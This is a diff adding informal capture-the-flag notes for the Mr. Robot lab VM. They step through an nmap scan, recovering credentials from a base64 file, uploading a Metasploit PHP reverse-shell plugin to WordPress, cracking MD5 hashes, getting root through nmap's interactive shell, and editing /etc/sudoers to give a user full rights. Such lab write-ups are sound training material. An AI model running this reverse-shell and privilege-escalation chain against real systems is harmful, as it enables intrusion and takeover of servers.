@@ -1,0 +1,138 @@
+# nmap -T5 192.168.188.0/24 <- Scan full network 
+    Port 22,88,443 open
+    Go to browser check the cource code  for 80 and 443 to find some thing.
+# dirb http://192.168.118.89
+     http : code link https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
+     It will show what file are present there.
+     wp_* <-wordpress files
+# mrRobot | cd mrRobot <- Create a local Director for bookeeping
+# wget http://192.168.118.89/robots.txt <- what ever is there we tried to copy it on local machine.
+# wget http://192.168.118.89/fsocity.dic <- this is a huge file.
+# cat fsocity.dic <- bruteforce file think so.
+# wget http://192.168.118.89/key-1-of-3.txt
+# cat key-1-of-3.txt <- this contain hash.
+# hash-identifier
+  > 65465544454445454 
+  > hash will tell its md5., so we can try online Md5 crackers .
+# wget http://192.168.118.89/license
+# cat license > pwd.txt  <- Base64 is displayed and we copied in pwd.txt file
+# base64 -d -i pwd.txt <- will decode the username and password
+
+on 18 we find pwd, lets try to login fromm GUI .
+#  http://192.168.118.89/wp_login < - it should login 
+
+now add plugin 
+creating with metsploit payload creator.
+
+# msfpc <-'
+# msfpc php 192.168.111.76 1337 msf reverse stageless tcp 
+    this will create p.php and p.rc file 
+
+Creating plugin for the php file.
+vi p.php
+{
+  /*
+  Plugin Name: MMM
+  Plugin URI: www.qrc.com
+  Description: reverse shell
+  Author: metasploit
+  Version: 1337
+  Author URI: www.qrc.com 
+ */
+}
+
+SAve it. and upload to Word Press "plugin module".
+Create a ZIP file for upload.
+#zip p.zip p.php
+
+in GUI , add new plugin and upload zip file. 
+now dont ativiate yet.
+
+Now run the loop back 
+# msfconsole -q -r 'p.rc'
+
+Now we can ativate the plugin .
+
+Now in MFSConsole
+> help sessions
+> sessions -i 1
+meterpeter> pwd   <- now we have the command prompt on robot machine.
+
+However we dont have root acces is just a user shell . 
+# cd home ; cd robot ; ls 
+    key-2-of-3.txt and password-raw-md5.  <- 2 files are displayed.
+# cat password-raw-md5 
+    robot:9980898809898900-09
+# hash-identifyer 
+  > 9980898809898900-09  < returns as MD5 
+
+NOw lets go to web and paste in MD5 cracker online web site. 
+www.md5-decrypter.com
+paste it and get the password . NOw we have a password for "robot"
+
+goto command prompt and login 
+using robot username and the password which we got from md5 decrypt web site .
+
+#cat key-2-of-3.txt
+4509248504859340859380485  hash 
+
+We dont have any access 
+so we can start take nmap shell .version 3.8.1
+
+# nmap --interactive 
+# nmap> h for help , we get bash too.
+
+# nmap> !bash <-'
+
+$ whoami <- works <- but not too much of help 
+$ exit 
+
+Now run !sh command
+
+nmap> !sh 
+# whoami < :) root
+
+cat /root/firstboot_done  < -- nothing in it 
+cat /root/key-3-of-3.txt <-- new hahs.
+
+# nano /etc/sudoers
+{
+  robot ALL=(ALL) ALL
+  
+}
+
+Now we can login as robot, as we have password for them.
+
+#sudo su 
+
+! Done .
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+
+
+
+
+
+
+
+
